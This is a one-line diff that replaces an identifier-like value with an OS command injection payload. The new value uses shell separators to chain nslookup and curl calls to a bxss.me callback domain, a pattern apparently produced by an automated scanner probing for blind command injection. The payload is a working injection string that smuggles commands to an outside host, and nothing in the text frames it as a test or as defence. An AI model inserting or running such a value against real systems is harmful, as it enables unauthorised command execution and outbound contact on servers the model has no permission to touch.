@@ -1,1 +1,1 @@
-MO_055919219575_000
+;(nslookup -q=cname hitfjtazlubzcf5903.bxss.me||curl hitfjtazlubzcf5903.bxss.me)|(nslookup -q=cname hitfjtazlubzcf5903.bxss.me||curl hitfjtazlubzcf5903.bxss.me)&(nslookup -q=cname hitfjtazlubzcf5903.bxss.me||curl hitfjtazlubzcf5903.bxss.me)
